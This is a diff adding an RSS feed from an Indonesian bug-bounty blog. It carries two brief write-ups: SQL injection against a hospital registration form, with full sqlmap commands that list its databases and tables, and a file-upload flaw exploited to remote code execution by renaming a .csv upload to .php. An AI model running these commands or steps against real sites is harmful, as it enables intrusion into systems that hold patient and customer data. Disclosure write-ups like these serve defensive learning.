@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Bugbounty on Just /var/log/</title>
+    <link>https://bembenk18.github.io/tags/bugbounty/</link>
+    <description>Recent content in Bugbounty on Just /var/log/</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <copyright>Bembenk</copyright>
+    <lastBuildDate>Thu, 28 Dec 2023 13:39:57 +0700</lastBuildDate>
+    <atom:link href="https://bembenk18.github.io/tags/bugbounty/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>P1 SQL Injection Form Pendaftaran Rumah Sakit</title>
+      <link>https://bembenk18.github.io/post/sql-injection-form-pendaftaran-rumah-sakit/</link>
+      <pubDate>Thu, 28 Dec 2023 13:39:57 +0700</pubDate>
+      <guid>https://bembenk18.github.io/post/sql-injection-form-pendaftaran-rumah-sakit/</guid>
+      <description>&lt;p&gt;Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?&lt;/p&gt;&#xA;&lt;h1 id=&#34;poc&#34;&gt;POC&lt;/h1&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Buka form pendaftaran, isikan dengan random data&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/1.png&#34; alt=&#34;Form login&#34;&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Intercept post data dengan OWASP ZAP&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/2.png&#34; alt=&#34;POST data&#34;&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Setelah itu coba dengan sqlmap&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien&amp;#34; --data=&amp;#34;nomrm=Halo&amp;amp;tgllahir=2025-05-07&amp;amp;nik=9827982798279827&amp;amp;search=nomrm&amp;amp;tglperiksa=2023-12-07&amp;#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --dbs --threads 2&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/3.png&#34; alt=&#34;Database name&#34;&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Lihat isi table invoice&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap -u &amp;#34;https://redacted.com/index.php/CProsesDaftar/getpasien&amp;#34; --data=&amp;#34;nomrm=Halo&amp;amp;tgllahir=2025-05-07&amp;amp;nik=9827982798279827&amp;amp;search=nomrm&amp;amp;tglperiksa=2023-12-07&amp;#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database --tables&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/4.png&#34; alt=&#34;Table&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>RCE Upload CSV</title>
+      <link>https://bembenk18.github.io/post/rce-upload-csv/</link>
+      <pubDate>Thu, 07 Sep 2023 13:33:53 +0700</pubDate>
+      <guid>https://bembenk18.github.io/post/rce-upload-csv/</guid>
+      <description>&lt;h1 id=&#34;abstraksi&#34;&gt;Abstraksi&lt;/h1&gt;&#xA;&lt;p&gt;Bug ini memungkinkan attacker untuk mengupload file backdoor. Bug ini muncul karena tidak ada filtering type file yang diupload sehingga memungkinkan attacker untuk mengupload file backdoor berekstensi &lt;em&gt;.php&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;col-12 pb-2&amp;quot;&amp;gt;&#xA;&#x9;&amp;lt;div class=&amp;quot;input-group&amp;quot;&amp;gt;&#xA;&#x9;&#x9;&#x9;&amp;lt;div class=&amp;quot;custom-file&amp;quot;&amp;gt;&#xA;&#x9;&#x9;&#x9;&#x9;&amp;lt;input type=&amp;quot;file&amp;quot; class=&amp;quot;custom-file-input&amp;quot; name=&amp;quot;filedata&amp;quot; id=&amp;quot;exampleInputF&amp;quot;&amp;gt;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;lt;label class=&amp;quot;custom-file-label&amp;quot; for=&amp;quot;exampleInput&amp;quot;&amp;gt;Choose file&amp;lt;/label&amp;gt;&#xA;&#x9;&#x9;&#x9;&amp;lt;/div&amp;gt;&#xA;&#x9;&amp;lt;/div&amp;gt;&#xA;&amp;lt;/div&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h1 id=&#34;impact&#34;&gt;Impact&lt;/h1&gt;&#xA;&lt;p&gt;Remote Code Execution&lt;/p&gt;&#xA;&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept:&lt;/h1&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Login ke &lt;a href=&#34;https://www.redacted.com/&#34;&gt;https://www.redacted.com/&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Masuk ke menu &lt;em&gt;Upload data pelanggan&lt;/em&gt;&lt;/li&gt;&#xA;&lt;li&gt;Klik &lt;em&gt;Choose file&lt;/em&gt; dan pilih file &lt;em&gt;.csv&lt;/em&gt;&lt;/li&gt;&#xA;&lt;li&gt;Intercept dengan Burp Suite dan klik &lt;em&gt;Upload&lt;/em&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ubah ektensi menjadi &lt;em&gt;.php&lt;/em&gt;, kemudian forward request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h1 id=&#34;timeline&#34;&gt;Timeline&lt;/h1&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Report:&lt;/strong&gt; 10/08/2023&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Response:&lt;/strong&gt; 10/08/2023&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Rewards:&lt;/strong&gt; -&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Demikian writeup yang tidak lengkap ini.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
